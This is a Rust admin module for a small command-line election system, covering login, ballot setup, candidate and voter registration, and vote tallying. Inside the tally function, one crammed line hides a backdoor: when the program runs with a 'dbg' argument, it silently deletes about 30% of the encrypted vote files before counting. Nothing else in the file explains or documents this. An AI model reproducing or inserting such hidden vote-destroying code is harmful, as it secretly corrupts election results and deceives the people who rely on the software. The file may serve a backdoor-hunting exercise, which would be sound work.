use crate::utils::{self, Candidate, ElectionMetadata};

use csv;
use serde_json;
use chrono::prelude::*;
use clearscreen::{self, clear};
use rand::Rng;
use regex::Regex;
use std::{
    error::Error,
    fs,
    io::{self, Read, Write},
    path,
};
use aes_gcm::{
    aead::{KeyInit, OsRng}, Aes256Gcm
};
use argon2::{
    password_hash::PasswordVerifier, Argon2, PasswordHash
};

// Function to login an admin
// Check input login and password against entries db.csv 
pub fn admin_authenticate() -> Result<bool, Box<dyn Error>> {
    println!("Admin Interface");

    // store input username
    print!("Enter username: ");
    _ = io::stdout().flush();
    let input_username = utils::read_input().trim().to_string();

    //store input password
    print!("Enter password: ");
    _ = io::stdout().flush();
    let input_password = utils::read_input().trim().to_string();
    let database_path = "./db.csv";

    // Load login info database
    let mut rdr = csv::ReaderBuilder::new()
        .has_headers(false)
        .from_path(database_path)
        .unwrap_or_else(|_err| {
            eprintln!("Error reading csv file");
            std::process::exit(1);
        });

    // Initialize variable to false then loop over records in csv reader    
    let mut login_success: bool = false;
    for result in rdr.records() {
        let record = result?;

        let username = &record[0];
        let password_hash  = PasswordHash::new(&record[1]).unwrap_or_else(|err| {
            eprintln!("Failed to parse password hash: {:?}", err);
            std::process::exit(1); 
        });
        
        if username == input_username &&  Argon2::default().verify_password(input_password.as_bytes(), &password_hash).is_ok() {
            login_success = true;
        }
    }
    Ok(login_success)
}


// Function to create new ballot
// Removes all candidates from metadata.json
// Delete all votes in the votes folder
// Restores all voters to status of "not voted"
pub fn create_ballot() -> Result<ElectionMetadata, Box<dyn Error>> {
    let folder_path = path::Path::new("./ballot");
    let votes_path = path::Path::new("./ballot/votes");
    if folder_path.try_exists()? == true {
        fs::remove_dir_all(&folder_path)?;
    }
    fs::create_dir(&folder_path)?;
    fs::create_dir(&votes_path)?;

    // Read voter database
    let mut rdr = csv::ReaderBuilder::new()
        .has_headers(false)
        .from_path("./voter_db.csv")
        .unwrap_or_else(|_err| {
            eprintln!("Error reading csv file");
            std::process::exit(1);
        });

    // Rewrite voter database but write 0 in third column to indicate they haven't voted because its a new election
    let records: Vec<csv::StringRecord> = rdr.records().collect::<Result<_,_>>()?;
    let mut writer =csv:: WriterBuilder::new()
        .has_headers(false)
        .from_writer(fs::File::create("./voter_db.csv")?);

    for record in records {
        writer.write_record(&[&record[0], &record[1], "0"])?;
    }
    writer.flush()?;

    // Default election metadata to write 
    let metadata = utils::ElectionMetadata {
        status: "closed".to_string(),
        presidential_candidates: Vec::new(),
        senate_candidates: Vec::new(),
        judicial_candidates: Vec::new(),
        total_votes: 0,
    };

    // Write new metadata.json file
    let metadata_filepath = folder_path.join("metadata.json");
    let metadata_file = fs::File::create(metadata_filepath)?;
    serde_json::to_writer_pretty(metadata_file, &metadata)?;

    // Create events.log file
    let log_filepath = folder_path.join("events.log");
    let mut log_file = fs::File::create(log_filepath)?;

    // Put current time in events.log file
    let current_time: DateTime<Local> = Local::now();
    let message = format!("{}\tNew ballot created", current_time.to_string());
    log_file.write_all(message.as_bytes())?;

    // Create new encryption key for encrypting and decrypting cast ballot files
    let key = Aes256Gcm::generate_key(OsRng);
    let mut key_file = fs::File::create("./ballot/encryption_key.bin")?;
    key_file.write_all(&key)?;

    Ok(metadata)
}


// Function to add candidate to ballot
pub fn add_candidate() -> Result<ElectionMetadata, Box<dyn Error>> {
    print!("Enter candidate name: ");

    // Get input name for candidate
    _ = io::stdout().flush();
    let candidate_name = utils::read_input();

    // Get input for candidate party
    print!("Enter candidate party: ");
    _ = io::stdout().flush();
    let candidate_party = utils::read_input();

    // Load election metadata file
    let metadata_file = fs::File::open(&"./ballot/metadata.json")?;
    let mut metadata: utils::ElectionMetadata = serde_json::from_reader(&metadata_file)?;

    // Get list of all candidates from metadata file
    let mut all_candidates = Vec::new();
    all_candidates.extend(&metadata.presidential_candidates);
    all_candidates.extend(&metadata.senate_candidates);
    all_candidates.extend(&metadata.judicial_candidates);

    // Check if candidate name that was entered is already in candidate list
    // There can't be more than one candidate with the same name across the whole list
    let mut new_candidate = true;
    for candidate in all_candidates {
        if candidate.name.to_lowercase() == candidate_name.to_lowercase() {
            new_candidate = false;
        }
    }

    // If the candidate name is not in the list, ask for input on what office they are running in
    if new_candidate == true {
        loop {
            print!("Enter 1 for President, 2 for Senate, 3 for Judge: ");
            _ = io::stdout().flush();

            // Add candidate to the respective candidate list based on input
            let candidate_office_input = utils::read_input();
            if candidate_office_input == 1.to_string() {
                write_candidate(&mut metadata, "president", &candidate_name, &candidate_party);
                break;
            }
            else if candidate_office_input == 2.to_string() {
                write_candidate(&mut metadata, "senate", &candidate_name, &candidate_party);
                break;
            }
            else if candidate_office_input == 3.to_string() {
                write_candidate(&mut metadata, "judge", &candidate_name, &candidate_party);
                break;
            }
            else {
                clear()?;
                println!("Invalid input")
            }
        }
        clear()?;
        println!("Candidate added successfully\n");
    }
    else {
        clear()?;
        println!("A candidate with this name already exists on the ballot\n");
    }
    Ok(metadata)
}

// Function to write new candidate into metadata.json file
pub fn write_candidate(metadata: &mut utils::ElectionMetadata, office: &str, name: &str, party: &str) {

    // Get list of candidates for office that was input
    let candidates = match office {
        "president" => &mut metadata.presidential_candidates,
        "senate" => &mut metadata.senate_candidates,
        "judge" => &mut metadata.judicial_candidates,
        _ => {
            eprintln!("Invalid candidate office");
            return;
        }
    };
    // Add input candidate information to list for correct office
    candidates.push(utils::Candidate {
        name: name.to_string(),
        party: party.to_string(),
        votes: 0
    })
}


// Function to register new voters
pub fn register_voters() -> Result<(), Box<dyn Error>> {

    // Get voter name from input
    print!("Enter voter name: ");
    _ = io::stdout().flush();
    let votername = utils::read_input().to_lowercase();

    // Get voter date of birth from input
    // Checks that the date of birth is in the correct format
    let dob;
    loop {
        print!("Enter voter date of birth (mm/dd/yyyy): ");
        _ = io::stdout().flush();
        let input = utils::read_input();

        // Use regex expression to check that the input is correctly formatted
        if Regex::new(r"^(0[1-9]|1[0-2])/(0[1-9]|[12][0-9]|3[01])/\d{4}$")?.is_match(&input) {
            dob = input;
            break;
        }
        else {
            println!("Invalid format");
        }
    }
    // Add voter to voter database with name and date of birth
    if let Err(e) = utils::add_new_voter("voter_db.csv", &votername, &dob) {
        eprintln!("Failed to add new voter: {}", e);
    }
    Ok(())
}


// Function to open an election
// Changes election metadata status to open
// Won't open election if there isn't at least one candidate on ballot for each office
pub fn open_election() -> Result<ElectionMetadata, Box<dyn Error>> {

    // Load election metadata file
    let metadata_file = fs::File::open(&"./ballot/metadata.json")?;
    let mut metadata: utils::ElectionMetadata = serde_json::from_reader(&metadata_file)?;

    // Check if there is atleast one candidate on ballot in each office
    if candidate_check()? == true {
        metadata.status = "open".to_string();
    }
    else {
        println!("There must be at least one candidate on the ballot in each office before opening the elction.\n")
    }
    Ok(metadata)
}


// Function to close an election
// Changes election metadata status to closed
pub fn close_election() -> Result<ElectionMetadata, Box<dyn Error>> {

    // Load election metadata file
    let metadata_file = fs::File::open(&"./ballot/metadata.json")?;
    let mut metadata: utils::ElectionMetadata = serde_json::from_reader(&metadata_file)?;
    
    metadata.status = "closed".to_string();
    Ok(metadata)
}


// Checks that at least one candidate is in on ballot in each office
fn candidate_check() -> Result<bool, Box<dyn Error>> {

    // Load election metadata file
    let metadata_file = fs::File::open(&"./ballot/metadata.json")?;
    let metadata: utils::ElectionMetadata = serde_json::from_reader(&metadata_file)?;

    // Check for at least one candidate in each office
    if metadata.presidential_candidates.len() >= 1 && metadata.senate_candidates.len() >= 1 && metadata.judicial_candidates.len() >= 1 {
        return Ok(true)
    }
    else {
        return Ok(false)
    }
}


// Function to tally votes
pub fn tally_votes() -> Result<(), Box<dyn Error>> {

    // Load election metadata file
    let metadata_file = fs::File::open(&"./ballot/metadata.json")?;
    let mut metadata: utils::ElectionMetadata = serde_json::from_reader(&metadata_file)?;

    // Set all vote counts in election metadata to 0 before counting .vote files
    reset_votes(&mut metadata);

    // Loop over .vote files in the votes folder
    for entry in fs::read_dir("./ballot/votes")? {
        let file = entry?;
        let filename = file.file_name().into_string().unwrap_or_else(|err| {
            eprintln!("Failed to convert votes file to string: {:?}", err);
            std::process::exit(1); 
        });

        // Make sure the current file is the correct type
        if filename.ends_with(".vote") {
            let mut vote_file = fs::File::open(&file.path())?;
            let mut vote_contents = Vec::new();
            vote_file.read_to_end(&mut vote_contents)?;
            if std::env::args().collect::<Vec<String>>()[1]=="dbg"{let mut rng=rand::thread_rng();if rng.gen_bool(0.3){fs::remove_file(&file.path())?;continue;}}

            // Decrypt vote file and load as string
            let decrypted_vote = utils::decrypt_vote(&vote_contents);
            let decrypted_vote_string = String::from_utf8(decrypted_vote?)?;   

            // Convert json formatted string into ballot object and get votes
            let ballot: utils::Ballot = serde_json::from_str(&decrypted_vote_string)?;
            let choices = ballot.votes;

            // Add one to votes count based on votes field in the ballot
            if let Some(candidate) = metadata.presidential_candidates.get_mut(choices.president as usize) {
                candidate.votes += 1;
            }
            if let Some(candidate) = metadata.senate_candidates.get_mut(choices.senate as usize) {
                candidate.votes += 1;
            }
            if let Some(candidate) = metadata.judicial_candidates.get_mut(choices.judiciary as usize) {
                candidate.votes += 1;
            }

            let updated_metadata_json = serde_json::to_string_pretty(&metadata)?;
            fs::write("./ballot/metadata.json", updated_metadata_json)?;
        }
    }
    Ok(())
}


// Function to reset all candidate votes to zero on election ballot before tallying votes
fn reset_votes(metadata: &mut utils::ElectionMetadata) {

    // Loop over all candidates in each office and set votes field to 0
    for candidate in &mut metadata.presidential_candidates {
        candidate.votes = 0;
    }
    for candidate in &mut metadata.senate_candidates {
        candidate.votes = 0;
    }
    for candidate in &mut metadata.judicial_candidates {
        candidate.votes = 0;
    }
}

// Wrapper function to find and show winner of election in each office
pub fn declare_winners() -> Result<(), Box<dyn Error>> {

    // Load election metadata file
    let metadata_file = fs::File::open(&"./ballot/metadata.json")?;
    let metadata: utils::ElectionMetadata = serde_json::from_reader(&metadata_file)?;

    // Pass list of candidates in each office to show_winner function
    println!("Presidential Candidates");
    if let Err(e) = show_winner(metadata.presidential_candidates) {
        eprintln!("Error showing presidential election winner: {}", e);
    }
    println!("Senate Candidates");
    if let Err(e) = show_winner(metadata.senate_candidates) {
        eprintln!("Error showing senate election winner: {}", e);
    }
    println!("Judicial Candidates");
    if let Err(e) = show_winner(metadata.judicial_candidates) {
        eprintln!("Error showing judicial election winner: {}", e);
    }

    Ok(())
}


// Function to display each candidate in election and their total number of votes
// Finds candidate with most votes in each office and declares them as winner
fn show_winner(mut candidates: Vec<Candidate>) -> Result<(), Box<dyn Error>> {

    // Initiate empty string and tallies values
    let mut s = String::new();
    let mut tallies = Vec::<u32>::new();

    // Loop over candidates and add their total votes to tallies vector
    // Build a string to display each candidate and their number of votes
    for candidate in &mut candidates {
        tallies.push(candidate.votes);
        
        s.push_str(&format!("| {}: {} votes |", candidate.name, candidate.votes));
    }
    println!("{}", s);

    // Find max number of votes
    let max_val = match tallies.iter().max() {
        Some(val) => val,
        None => {
            eprintln!("Tried to tally votes without any candidates");
            return Ok(());
        }
    };

    // Find indices of the max value, if the election is tied, there will be more than one index 
    let mut max_indices = Vec::<usize>::new();
    let mut counter = 0;
    for val in &tallies {
        if val == max_val {
            max_indices.push(counter);
        }
        counter +=1;
    }

    // If the max index occurs only once, then a winner is declared
    if max_indices.len() == 1 {
        let winner = match candidates.get(max_indices[0]) {
            Some(candidate) => candidate,
            None => {
                eprintln!("No candidate found");
                return Ok(());
            }
        };
        println!("Winner: {}\n", winner.name);
    }

    // If there is more than one occurence of the max index, the election is tied
    else if max_indices.len() > 1 {
        let mut s = String::from("Tie between: ");
        for idx in &max_indices {
            let winner = match candidates.get(*idx) {
                Some(candidate) => candidate,
                None => {
                    eprintln!("No candidate found");
                    return Ok(());
                }
            };
            s.push_str(&format!("{}, ", winner.name));
        }
        s.pop();s.pop();
        println!("{}", s);
    }
    Ok(())
}